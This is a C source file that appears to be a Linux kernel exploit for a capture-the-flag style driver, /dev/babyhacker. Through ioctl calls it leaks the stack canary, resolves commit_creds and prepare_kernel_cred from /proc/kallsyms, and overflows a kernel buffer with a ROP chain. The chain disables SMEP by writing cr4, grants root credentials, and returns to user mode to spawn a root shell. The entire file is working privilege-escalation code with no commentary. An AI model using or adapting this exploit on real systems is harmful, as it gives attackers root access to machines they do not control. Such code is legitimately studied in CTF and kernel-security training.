#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <linux/prctl.h>
#include <stdint.h>
#include <sys/un.h>
#include <asm/types.h>
#include <sched.h>




void get_shell() {
    system("/bin/sh");
}

size_t vmlinux_base = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;
unsigned long commit_creds = 0;
unsigned long prepare_kernel_cred = 0;

#define MMAP_BASE 0x2000000
#define MMAP_SIZE 0x100000

unsigned long get_symbol(char *name)
{
    FILE *f;
    unsigned long addr;
    char dummy, sym[512];
    int ret = 0;

    f = fopen("/proc/kallsyms", "r");
    if (!f) {
        return 0;
    }

    while (ret != EOF) {
        ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
        if (ret == 0) {
            fscanf(f, "%s\n", sym);
            continue;
        }
        if (!strcmp(name, sym)) {
            printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
            fclose(f);
            return addr;
        }
    }
    fclose(f);
    return 0;
}
void get_root() {
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}


void migrate_to_cpu0() {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0,&set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) == -1){
        perror("sched_setaffinity wrong");
        exit(-1);
    }
}

size_t user_cs, user_ss, user_rflags, user_sp;

void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        :"memory"
    );
}


#define GETSIZE 0x30000
#define KFU 0x30001
#define KTU 0x30002




int main() {
	save_state();
    migrate_to_cpu0();
    
    
    int fd = open("/dev/babyhacker", 0);
    if(fd < 0)
	{
		puts("[*]open /dev/babyhacker error!");
		exit(0);
	}
    ioctl(fd, GETSIZE, 0xffffffff);
    
    void *buf = mmap(NULL, 0x10000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("buf: %p\n", buf);
    ioctl(fd, KTU, buf);

    printf("canary: %p\n", *(unsigned long *)(buf+0x140));
    
    commit_creds = get_symbol("commit_creds");
    prepare_kernel_cred = get_symbol("prepare_kernel_cred");

	vmlinux_base = commit_creds - 0xa1430;
    unsigned long offset = vmlinux_base - raw_vmlinux_base;

    printf("offset: %p", offset);
    
	void *us_stack = mmap((void*)MMAP_BASE, MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0);
    unsigned long  rop[0x100] = {0};

	int i = 0;
	rop[i++] = 0xffffffff8109054d + offset; // pop rdi; ret
	rop[i++] = 0x6f0;
	rop[i++] = 0xffffffff81004d70 + offset; //mov cr4, rdi ; pop rbp ; ret
    rop[i++] = user_sp;

	rop[i++] = (unsigned long)get_root;
	
	
	rop[i++] = 0xffffffff810636b4 + offset; // swapgs; pop rbp; ret
	rop[i++] = user_sp;

	rop[i++] = 0xffffffff814712fe + offset; // iretq; 

	rop[i++] = (unsigned long)get_shell;			// rip 
	
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = (unsigned long)(us_stack+6000);
	rop[i++] = user_ss;

    memcpy((unsigned long *)(buf+0x150), rop, sizeof(rop));


    ioctl(fd, KFU, buf);


    return 0;
}